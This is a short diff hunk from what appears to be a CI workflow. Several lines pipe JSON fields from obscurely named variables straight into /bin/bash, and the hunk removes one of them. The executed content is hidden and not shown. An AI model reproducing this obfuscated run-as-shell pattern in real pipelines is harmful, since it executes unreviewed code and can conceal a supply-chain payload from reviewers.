@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$z9657" | jq -r .c32 | /bin/bash
           printf '%s' "$sscwq72" | jq -r .a9 | /bin/bash
           printf '%s' "$is0" | jq -r .d24295 | /bin/bash
-          printf '%s' "$wiqna0164" | jq -r .ceunz417 | /bin/bash
           echo $oqtj23 | jq -r .heot6 | /bin/bash
 
       - name: Persist output
